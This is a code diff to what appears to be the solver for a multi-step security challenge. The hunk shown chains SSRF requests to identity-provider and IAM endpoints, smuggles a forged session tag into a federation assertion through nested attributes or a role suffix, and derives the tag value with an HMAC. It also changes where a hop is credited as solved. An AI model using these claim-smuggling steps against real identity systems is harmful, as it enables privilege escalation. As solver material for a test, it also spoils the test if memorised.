@@ -110,8 +110,7 @@ def solve(base: str, echo=print, state: dict = None) -> str:
 
     # ---- hop 4: federation claim-smuggling -----------------------------------------------------
     a0 = ssrf(f"{IDP}/idp/assert?p={b64u({'entitlement': ent, 'role': granted_role, 'attributes': {}})}")
-    marker(a0)
-    sess0 = ssrf(f"{IAM}/iam/session?assertion={a0['assertion']}")["session"]
+    sess0 = ssrf(f"{IAM}/iam/session?assertion={a0['assertion']}")["session"]  # bootstrap, tag-less
     desc = ssrf(f"{IAM}/iam/describe?session={sess0}")
     family = desc.get("escalation_family")
     fed_family = desc.get("federation_family", "nested-attr")
@@ -128,7 +127,12 @@ def solve(base: str, echo=print, state: dict = None) -> str:
                     return r
         return None
 
-    tag_name, tag_value = find_condition(desc)
+    tag_name, _ = find_condition(desc)
+    # The trust value is not a literal — DERIVE it by combining two independent evidence pieces
+    # (review §3): the hop-3 entitlement token we hold, and the external_id published on the pivot,
+    # via the value_rule. A value-spray cannot guess this 16-hex HMAC.
+    sts = desc["session_tag_source"]
+    tag_value = hmac.new(ent.encode(), sts["external_id"].encode(), hashlib.sha256).hexdigest()[:16]
     # smuggle by the discovered federation family: a nested attribute, or the role scope suffix.
     if fed_family == "scoped-role":
         smug = {"entitlement": ent, "role": f"{granted_role};{tag_name}={tag_value}", "attributes": {}}
@@ -137,7 +141,9 @@ def solve(base: str, echo=print, state: dict = None) -> str:
         claim_ns = desc["session_tag_source"]["claim"].split(".", 1)[1]
         smug = {"entitlement": ent, "role": granted_role, "attributes": {claim_ns: {tag_name: tag_value}}}
     a1 = ssrf(f"{IDP}/idp/assert?p={b64u(smug)}")
-    sess1 = ssrf(f"{IAM}/iam/session?assertion={a1['assertion']}")["session"]
+    sess1_resp = ssrf(f"{IAM}/iam/session?assertion={a1['assertion']}")
+    marker(sess1_resp)  # h4 — credited ONLY here, when the smuggled tag actually lands on the session
+    sess1 = sess1_resp["session"]
     st.update(claim_ns=claim_ns, tag_name=tag_name, tag_value=tag_value, family=family,
               fed_family=fed_family, bootstrap_session=sess0, tagged_session=sess1)
 
